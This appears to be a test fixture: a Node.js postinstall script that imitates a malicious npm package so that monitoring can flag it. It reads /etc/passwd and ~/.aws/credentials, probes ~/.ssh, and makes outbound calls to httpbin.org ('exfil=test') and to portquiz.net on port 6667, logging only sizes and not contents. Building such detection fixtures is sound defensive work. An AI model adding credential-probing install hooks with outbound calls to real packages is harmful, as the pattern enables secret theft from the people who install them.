#!/usr/bin/env node
// postinstall.js — suspicious package: simulates malicious reconnaissance.
'use strict';

const fs   = require('fs');
const os   = require('os');
const http = require('http');
const net  = require('net');
const path = require('path');

// 1. Read /etc/hostname (will succeed — log it)
try {
  const hostname = fs.readFileSync('/etc/hostname', 'utf8').trim();
  console.log('[suspicious] /etc/hostname =>', hostname);
} catch (e) {
  console.log('[suspicious] /etc/hostname read failed:', e.message);
}

// 2. Read /etc/passwd — read first line only, don't print it
try {
  const passwd = fs.readFileSync('/etc/passwd', 'utf8');
  const firstLine = passwd.split('\n')[0];
  // Intentionally not logging the content — the probe is the point
  console.log('[suspicious] /etc/passwd read — first line length:', firstLine.length, '(not printed)');
} catch (e) {
  console.log('[suspicious] /etc/passwd read failed:', e.message);
}

// 3. Stat ~/.ssh/ — probe home dir sensitive area
const sshDir = path.join(os.homedir(), '.ssh');
try {
  const stat = fs.statSync(sshDir);
  console.log('[suspicious] ~/.ssh/ exists — isDirectory:', stat.isDirectory());
} catch (e) {
  console.log('[suspicious] ~/.ssh/ stat failed:', e.message);
}

// 4. Check ~/.aws/credentials if it exists
const awsCreds = path.join(os.homedir(), '.aws', 'credentials');
if (fs.existsSync(awsCreds)) {
  try {
    const creds = fs.readFileSync(awsCreds, 'utf8');
    // Intentionally not logging the content — the probe is the point
    console.log('[suspicious] ~/.aws/credentials exists — size:', creds.length, 'bytes (not printed)');
  } catch (e) {
    console.log('[suspicious] ~/.aws/credentials read failed:', e.message);
  }
} else {
  console.log('[suspicious] ~/.aws/credentials does not exist (probe attempted)');
}

// 5. HTTP GET to httpbin.org/anything?exfil=test (standard port 80)
const httpReq = http.get('http://httpbin.org/anything?exfil=test', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    console.log('[suspicious] HTTP GET http://httpbin.org/anything?exfil=test — status:', res.statusCode);
  });
});
httpReq.on('error', (err) => {
  console.log('[suspicious] HTTP GET to httpbin.org failed (non-fatal):', err.message);
});

// 6. TCP connect to portquiz.net:6667 (unusual IRC port — should flag remote_port 6667)
const socket = new net.Socket();
let connected6667 = false;
socket.setTimeout(8000);
socket.connect(6667, 'portquiz.net', () => {
  connected6667 = true;
  console.log('[suspicious] TCP connect to portquiz.net:6667 SUCCEEDED (unusual port)');
  socket.destroy();
});
socket.on('timeout', () => {
  console.log('[suspicious] TCP connect to portquiz.net:6667 timed out (probe attempted)');
  socket.destroy();
});
socket.on('error', (err) => {
  if (!connected6667) {
    console.log('[suspicious] TCP connect to portquiz.net:6667 failed (non-fatal):', err.message);
  }
});

console.log('[suspicious] reconnaissance postinstall complete.');
